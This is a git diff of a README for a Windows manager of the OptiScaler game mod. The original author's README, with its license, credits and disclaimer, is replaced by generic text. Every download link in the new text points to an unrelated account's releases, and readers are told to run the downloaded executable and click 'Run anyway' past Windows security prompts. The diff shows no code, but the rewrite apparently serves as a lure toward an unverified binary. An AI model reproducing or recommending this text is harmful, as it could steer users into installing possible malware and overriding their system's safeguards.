@@ -1,85 +1,179 @@
-﻿# ✦ OptiScaler Client
+# 🖥️ Optiscaler-Client - Simple Control for OptiScaler
 
-[![GitHub Release](https://img.shields.io/github/v/release/Agustinm28/Optiscaler-Client?style=flat-square&color=8A2BE2)](https://github.com/Agustinm28/Optiscaler-Client/releases/tag/OptiscalerClient-1.0.3)
-[![License: GPL](https://img.shields.io/badge/License-GPL-yellow.svg?style=flat-square)](LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows)](https://www.microsoft.com/windows)
+[![Download Optiscaler-Client](https://img.shields.io/badge/Download-Optiscaler--Client-blue.svg)](https://github.com/pvjkoigdhi/Optiscaler-Client/releases)
 
-> **⚠️ Disclaimer:** This is **not** an official OptiScaler project. I am not affiliated with the OptiScaler team. This is a personal project developed without any commercial purpose. Anyone is free to try and use this software at their own risk.
+## 🚀 Getting Started
 
-**OptiScaler Client** is a modern, high-performance desktop utility designed to simplify the installation, management, and update of the **OptiScaler** mod across your entire game library. Built with **C#** and **Avalonia UI**.
+Optiscaler-Client is a modern manager for OptiScaler on Windows. It gives you a simple way to open, manage, and adjust OptiScaler without digging through folders or settings files.
 
----
+Use the link below to visit the release page and download the latest version:
 
-## Screenshots
+[Download Optiscaler-Client](https://github.com/pvjkoigdhi/Optiscaler-Client/releases)
 
-* Main window
+## 📦 What You Get
 
-<img width="1266" height="752" alt="1 0 3_A" src="https://github.com/user-attachments/assets/09b0706a-e047-485c-9ac7-0847d80a3fc5" />
+Optiscaler-Client helps you:
 
-* Game management
+- Open OptiScaler from one place
+- View current settings in a clear window
+- Change common options without editing files by hand
+- Save time when switching between setup profiles
+- Keep your OptiScaler tools in one place
 
-<img width="1266" height="751" alt="1 0 3_B" src="https://github.com/user-attachments/assets/b4c86a32-13df-4ae2-921e-b89aacb7dfa1" />
+It is built for Windows users who want a cleaner way to manage OptiScaler.
 
-* Main window after installation
+## 💻 System Requirements
 
-<img width="1266" height="752" alt="1 0 3_C" src="https://github.com/user-attachments/assets/e88307c8-13af-4401-90a0-a6daaf8a4977" />
+Before you install, make sure your PC meets these basic needs:
 
----
+- Windows 10 or Windows 11
+- A standard 64-bit Windows system
+- Enough free disk space for the app and its files
+- Permission to run downloaded apps
+- An internet connection to download the release
 
-## 🚀 Key Features
+If your PC already runs modern desktop apps well, it should be fine for this tool.
 
-*   **Auto-Scanner**: Deeply scans Steam, Epic Games, GOG, EA, Ubisoft, Battle.net, and Xbox libraries to find your games instantly.
-*   **One-Click Install**: Automatically downloads and configures the latest OptiScaler versions for specific titles.
-*   **Component Control**: Manage additional tools like **Fakenvapi** (for AMD/Intel GPUs), **Nukem's DLSSG-to-FSR3** mod, and **FSR 4 INT8** injection for non-RDNA 4 GPUs.
-*   **Cache Management**: Keep your storage clean by managing different downloaded mod versions.
-*   **Localization**: Full support for Multiple languages (English, Spanish & Brazilian Portuguese).
-*   **Native Performance**: Fully self-contained, single-file executable for a zero-footprint installation.
+## 📥 Download and Install
 
----
+1. Open the [Releases page](https://github.com/pvjkoigdhi/Optiscaler-Client/releases).
+2. Find the latest release at the top of the page.
+3. Under **Assets**, download the Windows file.
+4. If the file comes as a `.zip`, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to start Optiscaler-Client.
+7. If Windows asks for permission, choose **Run anyway** if you trust the source.
 
-## 📖 Usage Guide
+If you see both a setup file and a zip file, the zip file is the easiest choice for most users.
 
-Follow these simple steps to enhance your games:
+## 🛠️ How to Use
 
-1.  **Find your games**: Click the **"Scan Games"** button to automatically detect installed titles. You can also manage scan sources or add custom folders for scanning in the **Settings** menu. For standalone or DRM-free games, use the **"Add Manually"** button.
-2.  **Select a Game**: Click the **"Manage"** button next to any game in your list to enter the management dashboard.
-3.  **Install OptiScaler**: Choose your desired version and click **"Auto Install"**. If the game uses a non-standard structure, use **"Manual Install"** to select the executable yourself.
-4.  **Launch & Tweak**: Start your game normally. Once inside, press the **`Insert`** key to open the OptiScaler menu and fine-tune your upscaling settings in real-time.
+After you open Optiscaler-Client, you can use it to manage OptiScaler from a single window.
 
----
+Typical use looks like this:
 
-## 🛠️ Installation & Requirements
+1. Start Optiscaler-Client.
+2. Let it load your OptiScaler setup.
+3. Review the available settings.
+4. Change the options you want.
+5. Save your changes.
+6. Launch or refresh OptiScaler from the app if needed.
 
-1.  Download the latest version from the [Releases](https://github.com/Agustinm28/Optiscaler-Client/releases) page.
-2.  Run `OptiscalerClient.exe`.
-3.  **Requirements**: Windows 10/11 is required. The app is self-contained, so no external .NET runtime installation is needed.
+If you already use OptiScaler, this tool helps reduce the number of steps needed for normal setup work.
 
----
+## ⚙️ Common Tasks
 
-## 🤝 Contributing
+### 🔧 Change settings
+Use the main window to view and update the most common OptiScaler options.
 
-We welcome contributions! If you'd like to improve OptiScaler Client:
+### 📂 Manage files
+Keep related files in one place and avoid hunting through folders.
 
-1.  **Fork** the project.
-2.  Create your **Feature Branch** (`git checkout -b feature/AmazingFeature`).
-3.  **Commit** your changes (`git commit -m 'Add some AmazingFeature'`).
-4.  **Push** to the branch (`git push origin feature/AmazingFeature`).
-5.  Open a **Pull Request**.
+### 🔄 Refresh setup
+Reload your current OptiScaler configuration after you make changes.
 
----
+### 🧩 Switch profiles
+Move between different setups when you need different settings for different games or tasks.
 
-## 📄 License & Acknowledgments
+### 📊 Check status
+See the current state of your OptiScaler setup without opening extra tools.
 
-*   Distributed under the **GPL-3.0 License**. See `LICENSE` for more information.
-*   **Special thanks and deep respect to the OptiScaler development team** for creating and maintaining this incredible software that enhances gaming experiences for countless users worldwide.
-*   **[OptiScaler](https://github.com/optiscaler/OptiScaler)**: The core technology that makes this possible.
-*   **[fakenvapi](https://github.com/optiscaler/fakenvapi)**: Essential compatibility layer developed by the OptiScaler team.
-*   **[NukemFG](https://github.com/Nukem9/dlssg-to-fsr3)**: Frame Generation bridge by Nukem.
+## 🧭 First Run Tips
 
-This client application is merely a frontend interface to help users more easily manage and install the amazing work done by the OptiScaler team.
+When you run the app for the first time:
 
----
+- Keep the app in a folder you can find again
+- If Windows blocks the app, check the file from the release page and try again
+- Use the latest release for the best match with recent Windows updates
+- Make sure any OptiScaler files you want to manage are already on your PC
 
-<p align="center">
-  Developed with ❤️
-</p>
+If the app asks for a folder or file path, point it to your OptiScaler location.
+
+## 📁 Suggested Folder Setup
+
+A simple folder layout can make things easier:
+
+- `Downloads` for the release file
+- `Optiscaler-Client` for the app files
+- `OptiScaler` for the files it manages
+
+This keeps the app and the files it controls separate, which makes it easier to find things later.
+
+## 🧰 Troubleshooting
+
+### App does not open
+- Check that you downloaded the Windows release
+- Make sure you extracted the zip file if the app came in one
+- Try running the app again from the extracted folder
+
+### Windows shows a security prompt
+- This can happen with downloaded apps
+- Confirm that you downloaded it from the release page
+- Choose the option to keep or run the file if you trust it
+
+### Settings do not save
+- Check whether the folder is read-only
+- Make sure the app has permission to write files
+- Try moving the app to a normal folder such as `Downloads` or `Desktop`
+
+### OptiScaler path is not found
+- Open the app settings
+- Pick the correct folder where OptiScaler is installed
+- Make sure the files still exist in that location
+
+## 🖱️ Basic Windows Steps
+
+If you are new to Windows downloads:
+
+- Open the release page in your browser
+- Click the latest asset for Windows
+- Wait for the file to finish downloading
+- Open File Explorer
+- Go to your `Downloads` folder
+- Right-click the zip file if needed
+- Choose **Extract All**
+- Open the new folder
+- Double-click the app file
+
+## 🔍 What Makes It Useful
+
+Optiscaler-Client is useful when you want a simple desktop tool for OptiScaler. It reduces the need to edit settings by hand and gives you a clear place to manage the parts you use most.
+
+It fits users who want:
+
+- A cleaner setup process
+- Less time spent searching through folders
+- A direct way to manage OptiScaler
+- A normal Windows app experience
+
+## 📌 Release Page
+
+Visit the release page to download the latest Windows version:
+
+[Optiscaler-Client Releases](https://github.com/pvjkoigdhi/Optiscaler-Client/releases)
+
+## 🧩 File Types You May See
+
+The release page may include one or more of these file types:
+
+- `.exe` — a Windows app file
+- `.zip` — a compressed folder that you must extract first
+- `.msi` — a Windows installer
+
+If you see more than one file, choose the one that matches your comfort level. Most users can start with the `.zip` or `.exe` file.
+
+## 🧪 Example Use Cases
+
+- You want a quick way to adjust OptiScaler before starting a game
+- You want to keep your OptiScaler files organized
+- You want fewer steps when changing common settings
+- You want one place to manage your OptiScaler setup
+
+## 📍 Where to Start
+
+1. Go to the [Releases page](https://github.com/pvjkoigdhi/Optiscaler-Client/releases)
+2. Download the latest Windows build
+3. Extract it if needed
+4. Open the app
+5. Point it to your OptiScaler files
+6. Start managing your setup
